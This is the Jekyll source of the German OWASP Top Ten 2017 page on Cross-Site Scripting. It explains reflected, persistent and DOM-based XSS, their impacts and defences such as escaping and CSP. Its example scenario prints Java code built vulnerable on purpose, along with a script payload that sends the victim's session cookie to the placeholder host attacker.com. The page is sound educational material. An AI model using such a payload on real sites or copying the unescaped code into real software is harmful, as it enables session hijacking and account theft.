---

document: OWASP Top Ten 2017 (de)
year: 2017
order: 13
en: A7_2017-Cross-Site_Scripting_(XSS)
title: A7:2017 Cross-Site Scripting (XSS)
lang: de
layout: full-width-document
author:
contributors:
tags: OWASP Top Ten 2017 (de), Top Ten, A7:2017, xss, de
exploitability: 3
prevalence: 3
detectability: 3
technical: 2

---

{% include risk_begin.html %}
{%- include risk_description.html pos="firstLeft" -%}
<!--- Threat Agent: --->
Automatisierte Tools können alle drei Formen von XSS erkennen und ausnutzen. Dafür sind Exploitation-Frameworks frei verfügbar.
{%- include risk_description.html pos="mid" -%}
<!--- Security Weakness: --->
XSS ist bzgl. der Anzahl der betroffenen Anwendungen in der [Datenerhebung](Methodik_und_Daten) die zweithäufigste Schwachstelle in der OWASP Top 10. Sie findet sich in etwa zweidrittel aller Anwendungen.<br>Automatisierte Tools können einige XSS-Schwachstellen automatisch finden. Das gilt insbesondere für ausgereifte Technologien wie PHP, J2EE / JSP und ASP.NET.
{%- include risk_description.html pos="right" -%}
<!--- Impacts: --->
Der Schaden durch XSS ist mittel für reflektiertes und DOM-basiertes XSS und schwerwiegend für persistentes XSS. Es kann zu Remote-Code-Execution im Browser des Opfers führen, beispielsweise für den Diebstahl von Zugangsdaten, Sessions oder zur Verbreitung von Schadsoftware beim Opfer.
{%- include risk_end.html -%}

{%- include t10_subsection_begin.html -%}
{%- include t10_subsection.html token="isTheApplicationVulnerable" pos="firstLeft" -%}
Es gibt drei Formen von XSS, die üblicherweise auf die Browser des Benutzers abzielen:<br>
* **Reflektiertes XSS**: Die Anwendung oder API beinhaltet ungeprüfte und nicht maskierte Nutzereingaben (Escaping) als Teil des HTML-Outputs. Ein erfolgreicher Angriff erlaubt es einem Angreifer, beliebiges HTML und JavaScript im Browser des Opfers auszuführen. Typischerweise wird ein Anwender dazu einen schädlichen Link aufrufen müssen, der auf eine vom Angreifer kontrollierte Seite zeigt, z.B. infizierte populäre Websites (Watering-Hole), Werbung oder vergleichbares.<br>
* **Persistentes XSS**: Die Anwendung oder API speichert unbereinigten Nutzer-Input der zu einem späteren Zeitpunkt von einem anderen Nutzer oder Administrator angezeigt wird. Persistentes XSS wird oft als hohes oder kritisches Risiko eingeschätzt.<br>
* **DOM-basiertes (lokales) XSS**: JavaScript Frameworks, Single-Page-Anwendungen und APIs, die vom Angreifer kontrollierte Daten dynamisch einbinden, sind für DOM-basiertes XSS anfällig. Im Idealfall würde die Anwendung keine vom Angreifer kontrollierten Daten an unsichere JavaScript APIs senden.<br>
Typische XSS-Angriffe sind Diebstahl von Sessions, Übernahme von Accounts, MFA-Bypass-Angriffe, DOM-Node-Replacementsoder Defacements (wie betrügerische Login-Seiten), Angriffe gegen den Browser des Nutzer wie schädliche Software-Downloads, Key-Logger und andere Client-basierte Angriffe.

{%- include t10_subsection.html token="howToPrevent" pos="right" -%}
von aktiven Browserinhalten getrennt werden. Das kann erreicht werden durch:<br>
* Verwendung von Frameworks, die XSS automatisch (by Design) maskieren, wie z.B. das aktuellste Ruby on Railsoder React JS. Lernen Sie die Einschränkungen des XSS-Schutzes jedes Frameworks kennen und sorgen Sie für eine angemessene Behandlung nicht abgedeckter Fälle.<br>
* Maskieren der nicht vertrauenswürdigen Daten in HTTP-Anfragen auf Grundlage des Kontexts im HTML Output (body, attribute, JavaScript, CSS oder URL) zur Verhinderung von Schwachstellen mit reflektiertem und persistentem XSS. Das [OWASP Cheat Sheet 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) bietet weitere Informationen über erforderliche Maskierungs-Techniken.<br>
* Kontextsensitive Kodierung bei der Modifikation der Browserdaten auf der Client-Seite schützt vor DOM-basiertem XSS. Falls das auf diese Weise nicht vermieden werden kann, können vergleichbare kontextsensitive Maskierungs-Techniken auf Browser APIs angewendet werden, wie im [OWASP Cheat Sheet 'DOM based XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) beschrieben.<br>
* Aktivierung von [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) als tiefgreifende Schutzmaßnahme gegen XSS, so lange keine anderen Schwachstellen die lokale Einbindung von Schadcode erlauben (z.B. path traversal overwrites oder verwundbare Bibliotheken aus verwendeten Quellen).

{%- include t10_subsection.html token="exampleAttackScenarios" pos="left" -%}
**Szenario 1**: Die Anwendung übernimmt nicht vertrauenswürdige Daten, die nicht auf Gültigkeit geprüft oder maskiert werden, um folgenden HTML-Code zu generieren:<br>
    {% include code_red_begin.html -%} (String) page += "<input name='creditcard' type='TEXT' {%- include code_red_end.html %}
    {% include code_red_begin.html -%} value='" + request.getParameter("CC") + "'>"; {%- include code_red_end.html %}

Der Angreifer ändert den Parameter ‘CC’ in seinem Browser auf:<br>
    {% include code_red_begin.html -%} '>&lt;script>document.location= {%- include code_red_end.html %}
    {% include code_red_begin.html -%} 'http://www.attacker.com/cgi-bin/cookie.cgi? {%- include code_red_end.html %}
    {% include code_red_begin.html -%} foo='+document.cookie&lt;/script>'. {%- include code_red_end.html %}
<br>
Durch diesen Angriff wird die Session-ID des Benutzers an die Seite des Angreifers gesendet, so dass der Angreifer die aktuelle Benutzersession übernehmen kann.<br>
**Anmerkung:** Angreifer können XSS nutzen, um jegliche automatisierte Abwehr der Anwendung gegen Cross-Site Request Forgery (CSRF) zu umgehen.

{%- include t10_subsection.html token="references" pos="right" -%}
**OWASP**<br>
* [OWASP Proactive Controls: Encode and Escape Data](/www-project-proactive-controls/v3/en/c4-encode-escape-data)<br>
* [OWASP Proactive Controls: Validate All Inputs](/www-project-proactive-controls/v3/en/c5-validate-inputs)<br>
* [OWASP Application Security Verification Standard: V5](/www-project-application-security-verification-standard)<br>
* [OWASP Testing Guide: Testing for Reflected XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)<br>
* [OWASP Testing Guide: Testing for Stored XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)<br>
* [OWASP Testing Guide: Testing for DOM XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)<br>
* [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)<br>
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)<br>
* [OWASP Cheat Sheet: XSS Filter Evasion](/www-community//xss-filter-evasion-cheatsheet)<br>
* [OWASP Java Encoder Project](/www-project-java-encoder) ([old wiki](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project))<br>
<br>
**Andere**<br>
* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)<br>
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
{% include t10_subsection_end.html %}